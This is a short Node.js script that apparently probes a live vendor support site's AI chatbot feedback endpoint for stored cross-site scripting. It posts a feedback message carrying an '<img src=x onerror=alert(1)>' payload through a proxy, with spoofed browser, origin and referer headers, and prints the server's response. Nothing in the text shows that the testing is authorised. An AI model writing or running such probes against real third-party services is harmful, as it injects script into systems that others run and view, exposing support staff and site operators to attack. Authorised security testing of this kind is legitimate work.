const {ProxyAgent, fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const B='https://support.bambulab.com';
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const body={userId:'1234567890123456789',feedbackClass:1,feedbackType:40,feedback:'<img src=x onerror=alert(1)> FEEDBACK-XSS',knowledgeId:'990187423236284416',sessionId:'sess-xss',origin:1,requestId:'clientID_text_xss',extendField4:'01M72CP6WK6V9DPYQMX4ASCRGM',messageSource:'ai'};
(async()=>{try{const r=await fetch(B+'/gw/robot/front/feedback',{method:'POST',headers:{'content-type':'application/json',origin:B,referer:B+'/liveChat','user-agent':UA,'x-robot-user':'probe','x-bbl-official-site-region':'EN'},body:JSON.stringify(body),dispatcher:d,signal:AbortSignal.timeout(20000)});console.log(r.status,(await r.text()).slice(0,300));}catch(e){console.log('ERR',e.message)}})();
